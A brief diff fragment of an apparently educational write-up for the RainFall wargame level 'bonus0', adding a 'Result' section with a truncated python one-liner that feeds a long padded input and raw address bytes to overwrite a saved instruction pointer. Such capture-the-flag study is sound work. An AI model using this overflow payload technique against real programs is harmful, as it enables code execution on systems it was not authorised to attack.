@@ -592,4 +592,8 @@ So we come back to `main` with new `EIP`:
 		 Saved registers:
 		  ebp at 0xbffff678, eip at 0xbffff67c
 
-I think it is just incred
+I think it is just incredible!
+
+# Result
+
+	bonus0@RainFall:~$ python -c 'print "0" * 4095 + "\n" + "123456789" + "\x5f\xf8\xf
